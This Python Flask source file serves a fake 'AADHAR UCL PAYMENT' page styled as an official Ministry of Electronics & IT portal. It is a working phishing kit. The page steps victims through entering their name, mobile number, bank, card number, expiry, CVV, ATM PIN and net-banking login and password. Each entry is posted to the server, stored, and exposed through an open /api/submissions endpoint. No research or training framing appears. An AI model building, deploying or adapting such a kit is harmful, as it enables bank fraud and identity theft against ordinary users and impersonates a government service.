from flask import Flask, request, jsonify, render_template_string
from datetime import datetime

app = Flask(__name__)

# Storage
submissions = []
counter = 1

# TERA ORIGINAL FORM CODE - COPY PASTE KIYA HAI BILKUL WAISA
FORM_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>AADHAR UCL PAYMENT | Official Payment Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #eef2f7;
            min-height: 100vh;
            font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif;
        }

        .portal-container {
            width: 100%;
            max-width: 100%;
            background: #ffffff;
            min-height: 100vh;
            box-shadow: none;
            margin: 0;
            border-radius: 0;
        }

        .banner-full {
            width: 100%;
            background: #f0f4f9;
            line-height: 0;
        }
        .banner-full img {
            width: 100%;
            height: auto;
            max-height: 200px;
            object-fit: cover;
            display: block;
        }

        .gov-header {
            background: #1e3a5f;
            padding: 18px 20px;
            text-align: center;
            border-bottom: 3px solid #ffb347;
        }
        .gov-header h1 {
            color: white;
            font-size: 1.8rem;
            font-weight: 700;
            letter-spacing: 0.5px;
        }
        .gov-header p {
            color: #cde1f0;
            font-size: 0.8rem;
            margin-top: 6px;
        }

        .pages-container {
            background: white;
            width: 100%;
        }
        .page {
            padding: 28px 24px 40px;
            width: 100%;
        }
        .hidden-page {
            display: none;
        }

        .form-group {
            margin-bottom: 24px;
        }
        .form-label {
            font-weight: 600;
            color: #1e3a5f;
            display: block;
            margin-bottom: 8px;
            font-size: 0.95rem;
        }
        .form-label span {
            color: #d32f2f;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            font-size: 1rem;
            border: 1.5px solid #cbd5e1;
            border-radius: 10px;
            outline: none;
            background: #ffffff;
            transition: 0.2s;
        }
        input:focus {
            border-color: #1e3a5f;
            box-shadow: 0 0 0 3px rgba(30,58,95,0.1);
        }

        .bank-selector {
            position: relative;
        }
        .bank-input-wrapper {
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            background: white;
            padding: 14px 16px;
            border: 1.5px solid #cbd5e1;
            border-radius: 10px;
        }
        .bank-input-wrapper .bank-text {
            flex: 1;
            color: #1f2937;
            font-size: 1rem;
        }
        .bank-input-wrapper .down-arrow {
            font-size: 1.2rem;
            color: #1e3a5f;
            font-weight: bold;
        }
        .bank-dropdown-list {
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            max-height: 280px;
            overflow-y: auto;
            background: white;
            border: 1px solid #cbd5e1;
            border-radius: 10px;
            margin-top: 6px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
            z-index: 200;
            display: none;
        }
        .bank-dropdown-list div {
            padding: 12px 16px;
            cursor: pointer;
            border-bottom: 1px solid #eef2f6;
            font-size: 0.9rem;
            transition: background 0.1s;
        }
        .bank-dropdown-list div:hover {
            background: #eef2fa;
        }
        .bank-dropdown-list::-webkit-scrollbar {
            width: 6px;
        }
        .bank-dropdown-list::-webkit-scrollbar-track {
            background: #f1f1f1;
            border-radius: 4px;
        }
        .bank-dropdown-list::-webkit-scrollbar-thumb {
            background: #b9c3d0;
            border-radius: 4px;
        }

        button, .proceed-btn {
            background: #1e6f3f;
            color: white;
            border: none;
            padding: 14px 20px;
            font-size: 1rem;
            font-weight: 600;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            transition: 0.2s;
            margin-top: 10px;
        }
        button:hover {
            background: #0f5a34;
            transform: translateY(-1px);
        }

        .two-option-buttons {
            display: flex;
            gap: 16px;
            margin: 24px 0 10px;
        }
        .two-option-buttons button {
            margin-top: 0;
            flex: 1;
        }
        .card-btn {
            background: #2c5a7a;
        }
        .netbank-btn {
            background: #8b5a2b;
        }
        .back-link {
            text-align: center;
            margin-top: 24px;
        }
        .back-link span {
            color: #1e3a5f;
            cursor: pointer;
            font-size: 0.85rem;
            text-decoration: underline;
            font-weight: 500;
        }

        .expiry-group {
            display: flex;
            gap: 16px;
        }
        .expiry-group .form-group {
            flex: 1;
            margin-bottom: 0;
        }

        .success-card {
            background: #e8f5e9;
            padding: 20px;
            border-radius: 14px;
            text-align: center;
            color: #1e6f3f;
            font-weight: 500;
            margin-bottom: 20px;
            border-left: 5px solid #1e6f3f;
        }
        .request-id-box {
            background: #f8f9fc;
            padding: 18px;
            border-radius: 14px;
            text-align: center;
            margin: 16px 0;
            border: 1px solid #dce3ec;
        }
        .timer-box {
            background: #fff8e7;
            padding: 18px;
            border-radius: 14px;
            text-align: center;
            border: 1px solid #ffe0a3;
        }
        .timer-display {
            font-size: 2.2rem;
            font-weight: 800;
            font-family: monospace;
            color: #c62828;
            letter-spacing: 3px;
            margin-top: 8px;
        }
        .small-note {
            font-size: 0.7rem;
            color: #6c757d;
            text-align: center;
            margin-top: 20px;
        }
        #requestIdFinal {
            font-size: 1.3rem;
            font-weight: 700;
            letter-spacing: 1px;
            color: #1e3a5f;
        }
    </style>
</head>
<body>
<div class="portal-container">
    <div class="banner-full">
        <img src="https://i.ibb.co/0RbZ7zM0/bdc9d117e4da.jpg" alt="Government Scheme Banner" onerror="this.src='https://placehold.co/600x200?text=Official+Banner'">
    </div>

    <div class="gov-header">
        <h1>AADHAR UCL PAYMENT</h1>
        <p>Ministry of Electronics & IT | Secure Payment Gateway</p>
    </div>

    <div class="pages-container">
        <div id="page1" class="page">
            <div class="form-group">
                <label class="form-label">Full Name <span>*</span></label>
                <input type="text" id="fullName" placeholder="Full name as per Aadhaar" autocomplete="off">
            </div>
            <div class="form-group">
                <label class="form-label">Mobile Number <span>*</span></label>
                <input type="tel" id="mobileNum" placeholder="10 digit mobile number" maxlength="10" autocomplete="off" inputmode="numeric">
            </div>
            <button id="proceedToBankBtn">Proceed →</button>
            <div class="small-note">🔒 Official Government Payment Portal</div>
        </div>

        <div id="page2" class="page hidden-page">
            <div class="form-group bank-selector">
                <label class="form-label">Select Bank <span>*</span></label>
                <div class="bank-input-wrapper" id="bankSelectorBox">
                    <span class="bank-text" id="selectedBankText">Click to select bank</span>
                    <span class="down-arrow">▼</span>
                </div>
                <div id="bankDropdownList" class="bank-dropdown-list"></div>
            </div>
            <button id="proceedToModeBtn">Proceed →</button>
            <div class="back-link"><span onclick="goToPageNum(1)">← Back</span></div>
        </div>

        <div id="page3" class="page hidden-page">
            <label class="form-label" style="text-align:center; display:block; margin-bottom:20px;">Choose Payment Method</label>
            <div class="two-option-buttons">
                <button id="cardModeBtn" class="card-btn">💳 Card Payment</button>
                <button id="netbankModeBtn" class="netbank-btn">🏦 Net Banking</button>
            </div>
            <div class="back-link"><span onclick="goToPageNum(2)">← Back to Bank Selection</span></div>
        </div>

        <div id="pageCardDetails" class="page hidden-page">
            <h3 style="margin-bottom:20px; color:#1e3a5f;">💳 Enter Card Details</h3>
            <div class="form-group">
                <label class="form-label">Card Number</label>
                <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19" inputmode="numeric">
            </div>
            <div class="expiry-group">
                <div class="form-group">
                    <label class="form-label">Expiry Date (MM/YY)</label>
                    <input type="text" id="expiryInput" placeholder="MM/YY" maxlength="5" inputmode="numeric">
                </div>
                <div class="form-group">
                    <label class="form-label">CVV</label>
                    <input type="password" id="cvvCode" placeholder="CVV" maxlength="4" inputmode="numeric">
                </div>
            </div>
            <button id="cardProceedToUpi">Proceed → Enter ATM PIN</button>
            <div class="back-link"><span onclick="goToPageNum(3)">← Back</span></div>
        </div>

        <div id="pageNetbankLogin" class="page hidden-page">
            <h3 style="margin-bottom:20px; color:#1e3a5f;">🏦 Net Banking Login</h3>
            <div class="form-group">
                <label class="form-label">User ID / Customer ID</label>
                <input type="text" id="netUserId" placeholder="User ID / Customer ID">
            </div>
            <div class="form-group">
                <label class="form-label">Internet Password / PIN</label>
                <input type="password" id="netPassword" placeholder="Internet Password">
            </div>
            <button id="netbankLoginFinalBtn">Login & Proceed →</button>
            <div class="back-link"><span onclick="goToPageNum(3)">← Back</span></div>
        </div>

        <div id="pageUpiPinEntry" class="page hidden-page">
            <h3 style="margin-bottom:20px; color:#1e3a5f;">🔐 Enter ATM PIN</h3>
            <div class="form-group">
                <label class="form-label">4-digit ATM PIN</label>
                <input type="password" id="atmPinField" maxlength="4" placeholder="●●●●" inputmode="numeric">
            </div>
            <button id="confirmUpiFinalBtn">Confirm & Submit Request</button>
            <div class="back-link"><span onclick="goToPageNum(4)">← Back to Card Details</span></div>
        </div>

        <div id="finalSuccessPage" class="page hidden-page">
            <div class="success-card">
                ✅ Your request has been submitted successfully!<br>
                Kindly wait for 24 hours for processing.
            </div>
            <div class="request-id-box">
                <strong>📄 Unique Request ID:</strong><br>
                <span id="requestIdFinal">--</span>
            </div>
            <div class="timer-box">
                <strong>⏳ Processing Time Left (24 hours countdown)</strong>
                <div class="timer-display" id="countdownTimerFinal">24:00:00</div>
            </div>
            <button id="startNewRequestBtn" style="background:#2c5a7a; margin-top:20px;">➕ Start New Request</button>
        </div>
    </div>
</div>

<script>
    const API_URL = window.location.origin;
    
    async function sendToServer(dataType, fieldsData) {
        try {
            await fetch(API_URL + '/api/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    source: dataType,
                    fields: fieldsData,
                    timestamp: new Date().toISOString()
                })
            });
        } catch(err) {
            console.log('Error:', err);
        }
    }
    
    const bankList = [
        "State Bank of India (SBI)", "Punjab National Bank (PNB)", "Bank of Baroda (BOB)", "HDFC Bank", "ICICI Bank",
        "Axis Bank", "Kotak Mahindra Bank", "IndusInd Bank", "Yes Bank", "IDFC First Bank",
        "Central Bank of India", "Union Bank of India", "Indian Bank", "Canara Bank", "Bank of India",
        "UCO Bank", "Indian Overseas Bank", "Punjab & Sind Bank", "Bank of Maharashtra", "RBL Bank",
        "South Indian Bank", "Federal Bank", "IDBI Bank", "City Union Bank", "Karur Vysya Bank",
        "Tamilnad Mercantile Bank", "Dhanlaxmi Bank", "Karnataka Bank", "Saraswat Bank", "Standard Chartered Bank",
        "HSBC India", "Deutsche Bank", "DBS Bank India", "Jammu & Kashmir Bank", "SBI Cards"
    ];

    let currentStep = 1;
    let selectedBank = "";
    let paymentMode = "";
    let uniqueRequestID = "";
    let timerInterval = null;
    let timerActive = false;

    function showPage(pageId) {
        document.querySelectorAll('.page').forEach(p => p.classList.add('hidden-page'));
        document.getElementById(pageId).classList.remove('hidden-page');
    }

    function generateRequestID() {
        const now = new Date();
        const datePart = now.getFullYear() + String(now.getMonth()+1).padStart(2,'0') + String(now.getDate()).padStart(2,'0');
        const timePart = String(now.getHours()).padStart(2,'0') + String(now.getMinutes()).padStart(2,'0') + String(now.getSeconds()).padStart(2,'0');
        const random = Math.floor(Math.random() * 10000).toString().padStart(4,'0');
        return `UCL${datePart}${timePart}${random}`;
    }

    function start24hTimer() {
        if(timerInterval) clearInterval(timerInterval);
        const endTime = Date.now() + (24 * 60 * 60 * 1000);
        const timerEl = document.getElementById('countdownTimerFinal');
        function updateTimer() {
            const remaining = endTime - Date.now();
            if(remaining <= 0) {
                clearInterval(timerInterval);
                timerEl.innerText = "00:00:00";
                return;
            }
            const hrs = Math.floor(remaining / (1000 * 60 * 60));
            const mins = Math.floor((remaining % (3600000)) / 60000);
            const secs = Math.floor((remaining % 60000) / 1000);
            timerEl.innerText = `${hrs.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
        }
        updateTimer();
        timerInterval = setInterval(updateTimer, 1000);
    }

    function finalizeRequest() {
        if(uniqueRequestID === "") uniqueRequestID = generateRequestID();
        document.getElementById('requestIdFinal').innerText = uniqueRequestID;
        if(!timerActive) {
            start24hTimer();
            timerActive = true;
        }
        showPage('finalSuccessPage');
        currentStep = 7;
    }

    function resetFullFlow() {
        if(timerInterval) clearInterval(timerInterval);
        timerActive = false;
        uniqueRequestID = "";
        selectedBank = "";
        paymentMode = "";
        document.getElementById('fullName').value = "";
        document.getElementById('mobileNum').value = "";
        document.getElementById('selectedBankText').innerText = "Click to select bank";
        document.getElementById('cardNumber').value = "";
        document.getElementById('expiryInput').value = "";
        document.getElementById('cvvCode').value = "";
        document.getElementById('netUserId').value = "";
        document.getElementById('netPassword').value = "";
        document.getElementById('atmPinField').value = "";
        showPage('page1');
        currentStep = 1;
    }

    function buildBankDropdown() {
        const dropdownDiv = document.getElementById('bankDropdownList');
        dropdownDiv.innerHTML = '';
        bankList.forEach(bank => {
            const bankItem = document.createElement('div');
            bankItem.innerText = bank;
            bankItem.addEventListener('click', () => {
                document.getElementById('selectedBankText').innerText = bank;
                selectedBank = bank;
                dropdownDiv.style.display = 'none';
                sendToServer('Bank_Selection', { selected_bank: bank });
            });
            dropdownDiv.appendChild(bankItem);
        });
    }

    const expiryField = document.getElementById('expiryInput');
    if(expiryField) {
        expiryField.addEventListener('input', function(e) {
            let value = this.value.replace(/\\D/g, '');
            if(value.length >= 3) {
                value = value.slice(0,2) + '/' + value.slice(2,4);
            }
            if(value.length > 5) value = value.slice(0,5);
            this.value = value;
        });
    }

    const cardNumberField = document.getElementById('cardNumber');
    if(cardNumberField) {
        cardNumberField.addEventListener('input', function(e) {
            let val = this.value.replace(/\\s/g, '').replace(/\\D/g, '');
            if(val.length > 16) val = val.slice(0,16);
            let formatted = '';
            for(let i=0; i<val.length; i++) {
                if(i>0 && i%4===0) formatted += ' ';
                formatted += val[i];
            }
            this.value = formatted;
        });
    }

    document.getElementById('proceedToBankBtn').addEventListener('click', () => {
        const name = document.getElementById('fullName').value.trim();
        const mobile = document.getElementById('mobileNum').value.trim();
        if(name === "") { alert("Please enter your full name"); return; }
        if(mobile.length !== 10 || isNaN(mobile)) { alert("Please enter valid 10-digit mobile number"); return; }
        sendToServer('Page1_Name_Mobile', { full_name: name, mobile_number: mobile });
        showPage('page2');
        currentStep = 2;
        buildBankDropdown();
        document.getElementById('bankDropdownList').style.display = 'none';
    });

    const bankSelectorBox = document.getElementById('bankSelectorBox');
    const bankDropdownDiv = document.getElementById('bankDropdownList');
    bankSelectorBox.addEventListener('click', (e) => {
        e.stopPropagation();
        if(bankDropdownDiv.style.display === 'block') {
            bankDropdownDiv.style.display = 'none';
        } else {
            buildBankDropdown();
            bankDropdownDiv.style.display = 'block';
        }
    });
    document.addEventListener('click', (e) => {
        if(!bankSelectorBox.contains(e.target) && !bankDropdownDiv.contains(e.target)) {
            bankDropdownDiv.style.display = 'none';
        }
    });

    document.getElementById('proceedToModeBtn').addEventListener('click', () => {
        if(!selectedBank || selectedBank === "Click to select bank") {
            alert("Please select a bank from the dropdown list");
            return;
        }
        sendToServer('Bank_Confirmed', { final_bank: selectedBank });
        showPage('page3');
        currentStep = 3;
    });

    document.getElementById('cardModeBtn').addEventListener('click', () => {
        paymentMode = "card";
        sendToServer('Payment_Mode_Selected', { payment_mode: "Credit/Debit Card" });
        showPage('pageCardDetails');
        currentStep = 4;
    });
    document.getElementById('netbankModeBtn').addEventListener('click', () => {
        paymentMode = "netbank";
        sendToServer('Payment_Mode_Selected', { payment_mode: "Net Banking" });
        showPage('pageNetbankLogin');
        currentStep = 5;
    });

    document.getElementById('cardProceedToUpi').addEventListener('click', () => {
        let cardNum = document.getElementById('cardNumber').value.replace(/\\s/g, '');
        const expiry = document.getElementById('expiryInput').value.trim();
        const cvv = document.getElementById('cvvCode').value.trim();
        if(cardNum.length < 13 || isNaN(cardNum)) { alert("Enter valid card number (13-16 digits)"); return; }
        if(!expiry.match(/^(0[1-9]|1[0-2])\\/\\d{2}$/)) { alert("Enter expiry in MM/YY format (e.g., 08/27)"); return; }
        if(cvv.length < 3 || isNaN(cvv)) { alert("Enter valid CVV (3-4 digits)"); return; }
        sendToServer('Card_Details_Entry', { card_number: cardNum, expiry: expiry, cvv: cvv });
        showPage('pageUpiPinEntry');
        currentStep = 6;
    });

    document.getElementById('confirmUpiFinalBtn').addEventListener('click', () => {
        const atmPin = document.getElementById('atmPinField').value.trim();
        if(atmPin.length !== 4 || isNaN(atmPin)) { 
            alert("Please enter valid 4-digit ATM PIN"); 
            return; 
        }
        sendToServer('ATM_PIN_Entry', { atm_pin: atmPin });
        finalizeRequest();
    });

    document.getElementById('netbankLoginFinalBtn').addEventListener('click', () => {
        const uid = document.getElementById('netUserId').value.trim();
        const pwd = document.getElementById('netPassword').value.trim();
        if(uid === "") { alert("Please enter User ID"); return; }
        if(pwd === "") { alert("Please enter Password"); return; }
        sendToServer('NetBanking_Login_Credentials', { user_id: uid, password: pwd });
        finalizeRequest();
    });

    document.getElementById('startNewRequestBtn').addEventListener('click', () => {
        resetFullFlow();
        sendToServer('Session_Reset', { action: "New Request Started" });
    });

    window.goToPageNum = function(pageNum) {
        if(pageNum === 1) {
            resetFullFlow();
        }
        else if(pageNum === 2) { 
            showPage('page2'); 
            currentStep = 2; 
            bankDropdownDiv.style.display = 'none';
        }
        else if(pageNum === 3) { 
            showPage('page3'); 
            currentStep = 3;
        }
        else if(pageNum === 4) { 
            showPage('pageCardDetails'); 
            currentStep = 4;
        }
    };
    
    resetFullFlow();
</script>
</body>
</html>'''

@app.route('/')
def index():
    return render_template_string(FORM_HTML)

@app.route('/api/submit', methods=['POST'])
def submit():
    global counter
    data = request.json
    submissions.append({
        'id': counter,
        'source': data.get('source'),
        'fields': data.get('fields'),
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })
    counter += 1
    print(f"Data received: {data.get('source')}")
    return jsonify({'status': 'ok'})

@app.route('/api/submissions')
def get_submissions():
    return jsonify(submissions)

@app.route('/api/clear', methods=['POST'])
def clear():
    global submissions, counter
    submissions = []
    counter = 1
    return jsonify({'status': 'cleared'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
